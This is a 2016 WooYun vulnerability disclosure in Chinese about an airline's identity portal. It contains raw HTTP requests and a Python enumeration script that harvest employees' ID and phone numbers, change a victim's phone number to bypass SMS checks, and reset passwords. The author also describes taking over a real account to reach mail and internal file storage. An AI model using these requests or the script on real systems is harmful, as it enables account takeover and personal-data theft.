{"id": 86533, "wybug_id": "wooyun-2016-0183875", "wybug_title": "上海航空员工个人信息泄露/密码重置(绕过短信验证)/内部资料泄露", "wybug_corp": "上海航空", "wybug_author": "大物期末不能挂", "wybug_date": "2016-03-13 00:50", "wybug_open_date": "2016-04-28 09:04", "wybug_type": "账户体系控制不严", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "认证设计不合理", "认证缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-04-28：\t细节向公众公开  简要描述： 帝都大三计算机专业学生，最近欲找实习，便在wooyun社区发悬赏贴。结果发完贴之后发现wb<5,无法进入社区，无奈去找漏洞。 详细说明：  0x01  故事如何开始寻找上海航空子域名时发现，东方航空员工都是从IDM统一身份认证自服务登陆。\nhttp://id.ceair.com:7777/idmsso/login.jsp\n由于不是80端口，而是7777端口，引起了我的关注。通过信息搜集和目录尝试，发现了以下目录\nhttp://id.ceair.com:7777/    Oracle Fusion Middleware 11g的界面。http://id.ceair.com:7777/manual/      Apache HTTP 服务器 2.2 文档 http://id.ceair.com:7777/sysadmin/       猜测是Oracle Fusion Middleware 11g的管理员登陆界面http://id.ceair.com:7777/idmsso/login.jsphttp://id.ceair.com:7777/iamsso/login.jsp  以上两个为一模一样的用户登陆界面，这个引起了我的关注。发现了未授权访问页面http://id.ceair.com:7777/idmsso/      而我们的故事，从这个页面开始\n0x02  未授权访问页面获取信息http://id.ceair.com:7777/idmsso/页面截图如下：\n\n从图片中发现，右上角登陆用户为null，然而我并没有登陆。访问页面时抓包，发现加载页面后会请求用户信息\nPOST /idmsso/Self.do?method=findInfo&userLogin=null HTTP/1.1Host: id.ceair.com:7777Content-Length: 0Accept: application/json, text/javascript, */*Origin: http://id.ceair.com:7777X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36Referer: http://id.ceair.com:7777/idmsso/left.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie:Connection: close\n其中userLogin参数为null，手工测试，改成zhangwei，liwei，zhangqiang等中国的大众姓名，发现均有数据返回。\n\n于是写了脚本，利用中国常用姓名top500测试。\n#coding = utf-8import reimport urllibimport timeimport randomdef gethtml(url):    while True:        try:            page = urllib.urlopen(url)            html = page.read()            return html            break        except:            print 'gethtml() error,try again'                        output = open('data.txt', 'w')output.closeurl = \"http://id.ceair.com:7777//idmsso/Self.do?method=findPersonalInfo&userLogin=\"for line in open(\"name.txt\"):    line=line.strip('\\n')    getinfo_url = url + line    html = gethtml(getinfo_url)    output = open('data.txt','a')    output.write(\"%s|%s\\n\"%(line,html))\n返回的数据格式为：{\"result\":[\"姓名\",\"性别\",\"邮箱\",\"身份证号\",\"手机号\",\"部门\",\"职位\",\"公司\"]}抓取数据保存在data.txt中，发现114个姓名未匹配到，剩余抓取386人信息。统计了一下，职位中带有总经理三个字的有15人修改密码可用，但是不知道原密码，故无法修改\nPOST /idmsso/Self.do?method=changePassword HTTP/1.1Host: id.ceair.com:7777Content-Length: 50Accept: application/json, text/javascript, */*Origin: http://id.ceair.com:7777X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://id.ceair.com:7777/idmsso/changepassword.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie:Connection: closeusername=用户名&oldpwd=旧密码&newpwd=新密码\n0x03 任意用户密码重置根据以上获取的用户信息，我们来进行密码重置。\nhttp://id.ceair.com:7777/iamsso/forget-password.jsp\n经过测试，此页面逻辑为1.输入正确的用户名和身份证号，点击获取验证码。2.后台判断无误后查找对应的手机号，发送短信验证码。3.提交判断短信验证码是否正确。根据之前获取的信息，我们可以轻易填写用户名和身份证号，但是要发送短信这一部分很麻烦。回顾之前的过程，发现这个未授权页面还可以修改手机号。\n\n数据包如下\nPOST /idmsso/Self.do?method=changemobile&mobile=手机号码&userLogin=用户名 HTTP/1.1Host: id.ceair.com:7777Content-Length: 0Accept: application/json, text/javascript, */*Origin: http://id.ceair.com:7777X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36Referer: http://id.ceair.com:7777/idmsso/personaldata.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie:Connection: close\n这里，我们将zhangwei的手机号改成了我们自己的手机号，然后获取验证码。\n\n修改成功\n\n\n\n密码强度很高，有大写小写字母，数字和特殊符号。重置密码之后，将张伟手机号再改回来。他下次发现登录不上，自己再重置密码即可解决。0x04 进入之后\nhttp://jwbte.ceair.com/app/addressbook_V2?t=1457774830778&ra=1&rp=0  公司所有人通讯录\n\n\n在这里面获取信息之后我们可重复进行上面的第二步，用脚本搜集更多信息\nhttps://mail.ceair.com/owa/#\n\n\n更改后的密码也可以登陆邮箱。\nhttp://pan.ceair.com/Home\n东航内部网盘，大量内部信息\n\n\n\n还有员工单点登陆。\n\n就大致看了几个网站，剩下的没深入，觉得已经可以证明危害，就提交了。   漏洞证明：  未授权访问页面：\nhttp://id.ceair.com:7777/idmsso/\n抓包修改数据即可获取员工信息，修改手机号。如果知道原密码，还可以修改密码任意用户密码重置：根据未授权访问页面获取的信息+修改对应员工手机号即可重置任意用户密码。\n\n\n\n   修复方案：  1.未授权页面删除或者添加权限控制。2.用户名可以添加一些规则,例如zhang.wei  wei.zhang 而不是zhangwei，太容易猜解了。3.公共网盘中不知道有没有企业需要的重要信息，如果有，建议不要放在公共网盘中。   版权声明：转载请注明来源 大物期末不能挂@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-03-14 09:04 厂商回复： 十分感谢! 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-13 03:15 |    \t\t大物期末不能挂 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:26        | 1.一个学渣，只求每门都不挂2.想把漏洞提...)\t\t \n  深夜审洞，66666    \n     2016-03-13 11:27 |    \t\tMr.Q \t\t\t( 普通白帽子  |\t\t\t        Rank:563 漏洞数:78        )\t\t \n  @大物期末不能挂 好久不见啊    \n     2016-03-13 12:09 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:148 漏洞数:65        | 我要是再正常一点就好了)\t\t \n  6666    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}